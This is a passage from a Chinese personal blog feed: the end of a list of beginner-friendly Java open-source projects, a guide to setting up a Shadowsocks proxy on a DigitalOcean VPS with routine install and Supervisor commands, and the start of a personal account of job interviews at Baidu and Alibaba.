&lt;li&gt;&lt;a href=&quot;http://www.openworm.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;OpenWorm&lt;/a&gt; – 运行于浏览器中的小线虫的神经力学模型，其模拟后端都是用 Java 写的。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/thatJavaNerd/JRAW&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JRAW&lt;/a&gt; – Reddit API 的 Java 包装。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/timmolter/XChart&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;XChart&lt;/a&gt; – 用于绘制数据的超轻量 Java 库。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://libgdx.badlogicgames.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libgdx&lt;/a&gt; – 用于创建游戏的开源框架。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/justinmeister/PongWithLibgdx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Particle Pong&lt;/a&gt; – 开源的乒乓类游戏。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/bitcoinj/bitcoinj&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;bitcoinj&lt;/a&gt; – Java 实现的比特币协议。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dustedrob/JStrava&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JStrava&lt;/a&gt; – Strava API 的 Java 包装。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Progether/JAdventure&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JAdventure&lt;/a&gt; – 基于 Java 的文字冒险游戏。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Codeusa/aurous-app&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Aurous&lt;/a&gt; – 能方便地从 Youtube 和其他来源的流建立庞大的播放列表和视频转换。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;享受编程和学习的快乐吧！&lt;/p&gt;
&lt;p&gt;————译文完————&lt;/p&gt;
&lt;p&gt;很久以前我在知乎上问过一个问题：&lt;a href=&quot;http://www.zhihu.com/question/22263074&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;有哪些适大学生参与的Java开源项目？&lt;/a&gt;，也确实收到了很多好回复。也下了 JUnit 源码看了一部分，不过 JUnit 毕竟是很成熟的项目了，从中学习软件设计的艺术是不错，但是想参与进去还是比较困难。所以 Javapapers 推荐的这几个项目很不错，代码量都很短，且都起于初步阶段，有兴趣参与的同学可以关注下。目前我比较感兴趣的是 bitcoinj 项目。&lt;/p&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      如果你正在寻找有趣的 Java 项目去参与和贡献，那么请继续阅读这篇文章。在学校里我们也许没有机会接触到真正的开发环境。在企业里我们可能做不了最喜欢的项目。在这样的情景下，让我们加入可以带给我们欢乐和兴趣的开源项目吧。
    
    </summary>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="Java" scheme="http://wuchong.me/tags/Java/"/>
    
      <category term="开源项目" scheme="http://wuchong.me/tags/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>DigitalOcean VPS 科学上网体验</title>
    <link href="http://wuchong.me/blog/2014/10/17/do-vps-ss/"/>
    <id>http://wuchong.me/blog/2014/10/17/do-vps-ss/</id>
    <published>2014-10-17T04:31:18.000Z</published>
    <updated>2016-03-08T12:09:00.000Z</updated>
    
    <content type="html">&lt;p&gt;今天 &lt;a href=&quot;https://www.glgoo.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;glgoo&lt;/a&gt; 暂停服务了，赖以生存的 Google 曲线救国方案没了，GoAgent 又太慢，遂想折腾个 VPS 搭个代理解决科学上网的燃眉之急。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1eldy44qjgcj20hu06b0u4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.digitalocean.com/?refcode=54668030e22a&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DigitalOcean&lt;/a&gt; 作为一个 VPS 提供商新秀，以其高性价比的优势一直与高富帅的老大哥 Linode 争夺市场。最近更是在 GitHub 针对高校学生的优惠活动「&lt;a href=&quot;https://education.github.com/pack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub Student Developer Pack&lt;/a&gt;」中推出免费 $100 的优惠服务，如果以最便宜的 $5/月 计算，可以用小两年了。对于长这么大还没玩过VPS的孩子来说，这诱惑太大了。用VPS来科学上网当然有点大材小用了，更多的是想在VPS架一些自己的网站（非博客）、跑些脚本、学点东西。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是对于普通学生来说要拿到这100刀还是比较麻烦的。首先，你得有个 GtiHub 账号，并且验证了你的 edu 邮箱（之前笔者在 GitHub 推出学生免费私人仓库时已经验证过了，再次感谢GitHub）。然后点击&lt;a href=&quot;https://education.github.com/pack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub Student Developer Pack&lt;/a&gt; 活动页面中「Get your pack」按钮，就可以看到合作产品的优惠活动了，这里包括了来自 NameCheap 的免费 .ME 域名，再次推荐。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/81b78497jw1eleh03z0fij20n006g3za.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过上图的链接和邀请码注册后，就可看到100刀了，但是还需要绑定个人信用卡或者使用 Paypal 支付5刀才能激活。前者可以用财付通的&lt;a href=&quot;https://www.tenpay.com/v2/account/interna/index.shtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;运通虚拟国际卡&lt;/a&gt;，但是目前已经不开放申请了。所以就用Paypal支付5刀吧。Paypal的激活就此略过。这之后就顺利的拿到 $105 了。&lt;/p&gt;
&lt;h2 id=&quot;第一个VPS&quot;&gt;&lt;a href=&quot;#第一个VPS&quot; class=&quot;headerlink&quot; title=&quot;第一个VPS&quot;&gt;&lt;/a&gt;第一个VPS&lt;/h2&gt;&lt;p&gt;接着就能快速创建VPS了，选择 $5/月的足矣，机房最好选在旧金山，DigitalOcean 美国西海岸机房速度还是非常优秀的，比纽约的要好，千万不能选新加坡，因为貌似还没有国内专线所以速度不敢恭维。如果已经创建了你的 Droplet 又想换机房，可以参考&lt;a href=&quot;http://www.laozuo.org/3907.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇博客&lt;/a&gt;。完成后便会收到含有主机 IP、登陆账户、密码的邮件。&lt;/p&gt;
&lt;p&gt;在 Mac/Linux 上可以直接在终端 ssh 到 VPS。Windows 的话我使用的 &lt;a href=&quot;http://www.putty.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PuTTY&lt;/a&gt;。接着你就可以操控你的 VPS 了。 &lt;/p&gt;
&lt;h2 id=&quot;ShadowSocks-科学上网&quot;&gt;&lt;a href=&quot;#ShadowSocks-科学上网&quot; class=&quot;headerlink&quot; title=&quot;ShadowSocks 科学上网&quot;&gt;&lt;/a&gt;ShadowSocks 科学上网&lt;/h2&gt;&lt;p&gt;ShadowSocks 说自己是一个「可穿透防火墙的轻量代理」。OK！这正是我想要的，能满足我科学上网的需求就够了。ShadowSocks 的 GitHub Wiki 主页上已经有详细的&lt;a href=&quot;https://github.com/clowwindy/shadowsocks/wiki/Shadowsocks-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;中文使用说明&lt;/a&gt;了。但作为搬运工，还是简要说明下吧。&lt;/p&gt;
&lt;p&gt;1.在服务端安装 shadowsocks 库&lt;br&gt;&lt;figure class=&quot;highlight cmake&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; python-pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; shadowsocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2.创建配置文件&lt;code&gt;/etc/shadowsocks.json&lt;/code&gt;。示例：&lt;br&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;server&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;服务器 IP 地址&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;8388&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;local_address&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;1080&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;mypassword&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;fast_open&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;workers&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上述配置，只需要修改&lt;code&gt;server&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;，其他默认即可。&lt;/p&gt;
&lt;p&gt;在服务器上运行 &lt;code&gt;ssserver -c /etc/shadowsocks.json&lt;/code&gt; 即可。如果要在后台运行， 请使用 &lt;a href=&quot;#后台运行&quot;&gt;SuperVisor&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;3.在 Mac/Windows 推荐使用客户端 &lt;a href=&quot;https://github.com/shadowsocks/shadowsocks-gui&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Shadowsocks GUI&lt;/a&gt; 连接代理。配置也非常简单，注意server ip 和 password 改成自己的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497jw1elejn2ajctj21040rs0vb.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Mac 端的启动后可以自动实现全局科学上网，并根据 GFWList 区分墙内外流量。Windows 端的需要配合浏览器代理一起使用，Chrome 的话推荐 &lt;a href=&quot;https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SwitchySharp&lt;/a&gt;切换代理设置。把浏览器代理设为下列参数即可：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;协议: &lt;span class=&quot;selector-tag&quot;&gt;socks5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;地址: 127&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;端口: 你填的 &lt;span class=&quot;selector-tag&quot;&gt;local_port&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果无法安装 SwitchySharp，可以先用下列参数启动 Chrome，强制它使用代理：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Chrome&lt;span class=&quot;selector-class&quot;&gt;.exe&lt;/span&gt; --proxy-server=&lt;span class=&quot;string&quot;&gt;&quot;socks5://127.0.0.1:1080&quot;&lt;/span&gt; --host-resolver-rules=&lt;span class=&quot;string&quot;&gt;&quot;MAP * 0.0.0.0 , EXCLUDE localhost&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;移动端也可以参考&lt;a href=&quot;https://github.com/clowwindy/shadowsocks/wiki/Ports-and-Clients&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Ports and Clients&lt;/a&gt;下载对应软件。但是只能在其内置浏览器中科学上网，所以移动端上 ShadowSocks 就不如 VPN 方便。&lt;/p&gt;
&lt;p&gt;4.完成&lt;/p&gt;
&lt;h2 id=&quot;后台运行&quot;&gt;&lt;a href=&quot;#后台运行&quot; class=&quot;headerlink&quot; title=&quot;后台运行&quot;&gt;&lt;/a&gt;后台运行&lt;/h2&gt;&lt;p&gt;如果要在后台运行，请使用 &lt;a href=&quot;https://github.com/clowwindy/shadowsocks/wiki/%E7%94%A8-Supervisor-%E8%BF%90%E8%A1%8C-Shadowsocks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;supervisor&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;执行&lt;/p&gt;
&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-&lt;span class=&quot;built_in&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;update&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-&lt;span class=&quot;built_in&quot;&gt;get&lt;/span&gt; install &lt;span class=&quot;keyword&quot;&gt;python&lt;/span&gt;-pip &lt;span class=&quot;keyword&quot;&gt;python&lt;/span&gt;-m2crypto supervisor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install shadowsocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编辑 &lt;code&gt;/etc/supervisor/conf.d/shadowsocks.conf&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;section&quot;&gt;[program:shadowsocks]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;command&lt;/span&gt;=ssserver -c /etc/shadowsocks.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;autorestart&lt;/span&gt;=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;user&lt;/span&gt;=nobody&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;/etc/default/supervisor&lt;/code&gt; 最后加一行：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;ulimit&lt;/span&gt; -n 51200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;执行&lt;br&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;service supervisor &lt;span class=&quot;literal&quot;&gt;start&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;supervisorctl reload&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果遇到问题，可以检查日志：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;supervisorctl tail &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; shadowsocks stderr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果修改了 shadowsocks 配置 &lt;code&gt;/etc/shadowsocks.json&lt;/code&gt;， 可以重启 shadowsocks：&lt;br&gt;&lt;figure class=&quot;highlight maxima&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;supervisorctl &lt;span class=&quot;built_in&quot;&gt;restart&lt;/span&gt; shadowsocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果修改了 Supervisor 的配置文件 /etc/supervisor/*， 可以更新 supervisor 配置：&lt;br&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;supervisorctl&lt;/span&gt; update&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后看看效果，访问 Google 和 Youtube 的速度如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497tw1elejwjkbxij216g0x6qdd.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;总体很满意，打开 Google 秒开，校园网看 Youtube 1080视频无压力。用来科学上网绝对是没问题了。甩 GoAgent 好几条街了。&lt;/p&gt;
&lt;h2 id=&quot;后记&quot;&gt;&lt;a href=&quot;#后记&quot; class=&quot;headerlink&quot; title=&quot;后记&quot;&gt;&lt;/a&gt;后记&lt;/h2&gt;&lt;p&gt;DigitalOcean VPS + ShadowSocks 能基本满足科学上网的需求了。但是我说了用 VPS 来科学上网就大材小用了，如果你只是为了科学上网，或者你不是程序员，看到 VPS 什么的就头大，那最好的办法就是买个 VPN ，方便实惠速度又快。在这里我比较推荐 &lt;a href=&quot;http://ugetvpn.com/?r=10ccb0196cc0a49b&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云梯VPN&lt;/a&gt;，算是国内比较出色的一款服务，最低10元/月，基本上国外网站都是秒开，看Youtube视频无压力，配置安装基本都傻瓜一键式，覆盖多平台（我这么做广告，是不是应该给点广告费啊）。唯一要吐槽的就是居然只有包年套餐！&lt;/p&gt;
&lt;p&gt;需要的可以走这里：&lt;a href=&quot;http://ugetvpn.com/?r=10ccb0196cc0a49b&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云梯VPN&lt;/a&gt;。线路推荐使用新加坡1号。&lt;/p&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      今天 glgoo 暂停服务了，赖以生存的 Google 曲线救国方案没了，GoAgent 又太慢，遂想折腾个 VPS 搭个代理解决科学上网的燃眉之急。DigitalOcean 作为一个 VPS 提供商新秀，以其高性价比的优势一直与高富帅的老大哥 Linode 争夺市场。最近更是在 GitHub 针对高校学生的优惠活动「GitHub Student Developer Pack」中推出免费 $100 的优惠服务，如果以最便宜的 $5/月 计算，可以用小两年了。对于长这么大还没玩过VPS的孩子来说，这诱惑太大了。用VPS来科学上网当然有点大材小用了，更多的是想在VPS架一些自己的网站（非博客）、跑些脚本、学点东西。
    
    </summary>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="科学上网" scheme="http://wuchong.me/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
      <category term="VPS" scheme="http://wuchong.me/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>找工作小记——善待挫折</title>
    <link href="http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/"/>
    <id>http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/</id>
    <published>2014-09-30T04:22:01.000Z</published>
    <updated>2016-03-08T12:15:36.000Z</updated>
    
    <content type="html">&lt;p&gt;马上就国庆假期了，自己的找工作历程也算是告一段落了。回首过往，这一路来的坎坎坷坷也算是颇为励志了，遂将心路历程一 一记载下来，希望能与大家共勉！本想写成一篇软文的，结果写着写着发现越写越像面经了，叹气！&lt;/p&gt;
&lt;p&gt;目前参加面试的公司不多只有百度和阿里，拿到的 offer 也只有百度网页搜索部的 Rank 团队和架构团队，阿里共享业务事业部中间件团队。我不是大牛，没有拿过 ACM、机器人足球、挑战杯这些高大上的奖，没发过论文，因为是专硕还被鄙视过好多回。我只是一枚水硕，水了一年的研究生发现什么都没学到，平时做的更多的是“代码搬运工”的活儿。看着自己的项目没一个能拿的出手的，连面试官也说我的项目经验一般。而自己的实习生面试经历更是惨不忍睹，最终能拿到 offer，离不开自身的努力和运气吧！&lt;/p&gt;
&lt;h2 id=&quot;惨痛的实习生面试&quot;&gt;&lt;a href=&quot;#惨痛的实习生面试&quot; class=&quot;headerlink&quot; title=&quot;惨痛的实习生面试&quot;&gt;&lt;/a&gt;惨痛的实习生面试&lt;/h2&gt;&lt;p&gt;认识我的朋友都知道进入阿里是我读研期间最大的梦想。而进入阿里巴巴实习是迈入阿里的第一步，我也把它看地非常重要。所以从寒假开始就有计划地推进着复习。然，事不遂人愿，有时候期望越大失望越大。信心满满地与小伙伴们参加完笔试后，耐心地等待面试通知。结果看着同学们一个个参加面试拿到实习 offer，最后自己的状态变成了“笔试未通过”，心理的打击确实挺大的。&lt;/p&gt;
&lt;p&gt;之后退而求其次，想着实习能进BAT的其他两家也不错。腾讯的笔试顺利通过了，然而初面表现特别糟糕，先是走错了楼层再是拿着 Java 的简历面 C++ 岗，一些基础知识答的也很烂，果不其然一面被刷了，心情特别糟糕。之后又有百度的实习生面试，面的后台开发岗，一面说是过了，参加二面时却帮我推给了前端岗，心里特别不是滋味，然后就没有然后了。&lt;/p&gt;
&lt;p&gt;就这样四月份经历了被 BAT 的轮番血虐后，有那么一段时间甚至开始怀疑自己，自己真有那么差劲吗？&lt;/p&gt;
&lt;p&gt;莎士比亚有言「不要只因一次失败，就放弃你原来决心想达到的目标」。毕竟还有内推和校招的机会，为了抓住仅剩的机会，放弃了寻找其他实习岗位和公司，并给自己列了一个 To-Do List，我相信只要我能完成这个 List 上的所有任务，BAT 绝对没有问题！最后我只完成了一半，就拿到了理想的 offer。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;阿里内推&quot;&gt;&lt;a href=&quot;#阿里内推&quot; class=&quot;headerlink&quot; title=&quot;阿里内推&quot;&gt;&lt;/a&gt;阿里内推&lt;/h2&gt;&lt;p&gt;7月初，阿里今年内推开始地特别早。那时候，我才将实验室项目告一段落，阿里大数据竞赛也进入了最后冲刺阶段，To-Do List 才开始做第一项。&lt;/p&gt;
&lt;p&gt;阿里笔试失败给我最大的教训就是笔试能躲则躲，而且今年内推的政策是不影响校招，所以果断就内推了。但是没有认识的学长在阿里，就去论坛上找了个学长，在微博上又找了个，两边一起推。等了好久，却一封内推信都没收到。有些忧伤，询问之后得知简历未通过，原因项目经历欠佳，那一瞬巨大的失落感席卷全身。与学长一番交流后答应帮我内推了，我也认识到简历中存在的一些问题。没办法，只能够拼命补基础知识，扩展知识广度和深度了。&lt;/p&gt;
&lt;h3 id=&quot;一面&quot;&gt;&lt;a href=&quot;#一面&quot; class=&quot;headerlink&quot; title=&quot;一面&quot;&gt;&lt;/a&gt;一面&lt;/h3&gt;&lt;p&gt;25日，正在为大数据竞赛训练一个模型，接到了来自杭州的电话。一面就这样开始了，师兄非常的和善，整个面试过程也很轻松，项目、算法、分布式、Linux、Vim 的一些问题也都回答的很顺。电面过程持续了大概半个小时。末了，我问师兄花名，师兄说等你进来就知道了（知道花名的条件是要先拿到 offer 啊）。&lt;/p&gt;
&lt;h3 id=&quot;二面&quot;&gt;&lt;a href=&quot;#二面&quot; class=&quot;headerlink&quot; title=&quot;二面&quot;&gt;&lt;/a&gt;二面&lt;/h3&gt;&lt;p&gt;29日，这天是阿里大数据竞赛的最后一天，早起看了分数，接受了我已无望重返前50的现实，也就是说这四五个月来的辛苦没有换来任何的奖励。不过我认为，「有时候你的付出不见得能得到等值的结果，但你的收获也没必要用结果取衡量」。事实是，这次失败的经历对我之后的面试帮助特别大。&lt;/p&gt;
&lt;p&gt;这一天，也是我内推二面的当天。很奇怪大家一二面都是电面，而我是通知的去大望路参加二面。二面官看起来非常的亲切，交流起来让人觉得很舒服，所以整个面试气氛并不紧张。二面官先是从我的项目入手，从遇到的问题延伸到大数据量下的解决方案。这个问题的讨论大概花了面试一半的时间，而另一半的时间则主要在讨论面试官出的一道比较变态的多线程问题。面试官提出一个多线程应用的具体背景，需要高效的解决方案。从来没遇到过类似的问题，心理有些不知所措，提了很多解决方案都被否决了。还好在最后答出了大致正确的方案。是的，整个面试过程大概40分钟，面试官只问了我这两个主要的问题。而这中间大多都是在经历提方案-被否决-提方案-被否决的过程，幸好最终侥幸答对了。后来我问面试官，为什么不考些算法题，面试官的意思是他不喜欢考算法，更喜欢实际的应用解决方案题，更能看出一个人的知识广度深度和潜力。确实，我也觉得算法题太应试教育了，但没办法，题还是得刷。回来路上刷新了自己的状态发现二面通过，很庆幸。不过这次面试让我看到自己对分布式、多线程知识掌握地并不扎实，回来后，重新调整了 To-Do List 的计划。&lt;/p&gt;
&lt;p&gt;后来得知二面官是北京中间件的主管，很遗憾的是，他最近主持的一期「阿里技术沙龙」没能去参加。少了一次接近大神的机会，希望以后还能有机会学习吧。&lt;/p&gt;
&lt;h2 id=&quot;百度内推插曲&quot;&gt;&lt;a href=&quot;#百度内推插曲&quot; class=&quot;headerlink&quot; title=&quot;百度内推插曲&quot;&gt;&lt;/a&gt;百度内推插曲&lt;/h2&gt;&lt;p&gt;在阿里二面到终面间大概有一两个月的空档期，在这之间参加了百度大搜索的内推。百度的内推比较乱，简历并不会上锁，一份简历居然可以被多个团队看到。所以就参加了两次内推面试。&lt;/p&gt;
&lt;p&gt;第一次面试是网页搜索部的 Rank 团队，先进行的电面，问题很像阿里内推一面，也很顺利，就最后有一个字符串编辑距离的算法题没回答好。后来还是被邀请去百度大厦二面了。二面官很喜欢算法题，每一道算法都会问复杂度是多少，有没有更优/其他解法，有的还需要手写代码，后来知道他们是 Rank 团队，所以整天都是跟算法、复杂度打交道。三面是经理面，到这儿技术一般是没问题了，所以问的问题更像是HR面的问题，考核的内容更侧重于对待技术的热情，做事是否踏实，与人的沟通交流能力，面对挫折时的表现等方面。&lt;/p&gt;
